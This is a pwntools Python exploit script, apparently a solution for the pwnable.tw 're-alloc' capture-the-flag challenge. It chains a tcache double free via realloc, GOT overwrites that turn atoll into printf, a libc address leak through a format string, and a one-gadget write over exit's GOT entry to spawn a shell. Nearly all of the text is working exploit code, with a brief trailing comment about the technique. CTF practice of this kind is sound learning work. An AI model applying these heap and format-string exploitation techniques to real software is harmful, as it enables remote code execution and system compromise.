from pwn import *
from icecream import ic

# Set up pwntools for the correct architecture
exe = "./re-alloc"
libc = ELF("./libc.so.6")
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("chall.pwnable.tw", 10106)
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

def alloc(ind, size, dat):
    sla(b"Your choice: ", b"1")
    sla(b"Index:", str(ind).encode())
    sla(b"Size:", str(size).encode())
    sla(b"Data:", dat)

def realloc(ind, size, dat):
    sla(b"Your choice: ", b"2")
    sla(b"Index:", str(ind).encode())
    sla(b"Size:", str(size).encode())
    if(size != 0 and size != 0xffffffff):
        sla(b"Data:", dat)

def free(ind):
    sla(b"Your choice: ", b"3")
    sla(b"Index", str(ind).encode())

def rebuild():
    pay = p64(0x0000000000401223) #pay += p64(elf.plt._exit)
    pay += p64(elf.plt.__read_chk+6)
    pay += p64(elf.plt.puts+6)
    pay += p64(elf.plt.__stack_chk_fail+6)
    pay += p64(elf.plt.printf+6)
    pay += p64(elf.plt.alarm+6)
    pay += p64(elf.plt.atoll+6)
    pay += p64(elf.plt.signal+6)
    pay += p64(elf.plt.realloc+6)
    pay += p64(elf.plt.setvbuf+6)
    return pay

def free_leak(dat): 
    sla(b"Your choice: ", b"3")
    sla(b"Index:", dat)
    return rl()

r = start()

init_proc = 0x00000000004011e3
ret = 0x0000000000401016

# get a double free in tcache
alloc(0, 0x68, b"A"*8)
realloc(0, 0, b"del")
realloc(0, 0x68, b"\x00"*16)
realloc(0, 0, b"del")
realloc(0, 0x68, p64(0x404028) + b"\x00"*8)

# abuse it 
alloc(1, 0x68, b"B"*8)
realloc(0, 0x78, b"JUNKJUNK")
free(0)
alloc(0, 0x68, rebuild()[16:-32] + p64(elf.plt.printf+6))

# leak libc
libc.address = int(free_leak(b"%7$p").strip(), 16) - 0x1e5760
one_gad = libc.address + 0xe2383
ic(hex(libc.address))

# format string exploitation ?
exit_got = 0x404018

for i in range(3):
    free_leak(f"%{exit_got%0x10000}c%16$hn".encode())
    free_leak(f"%{one_gad%0x10000}c%20$hn".encode())
    exit_got += 2
    one_gad = one_gad >> (8*2)

pause()
free_leak(f"%{0x40401e%0x10000}c%16$hn".encode())
free_leak(f"%20$hhn".encode())

r.interactive()
"""
realloc spilts the chunk into 2 if its smaller in size and make the other a free chunk.
---
cool stuff(from writeup): Changing atoll to printf will give us a format string as first argument which we control 
"""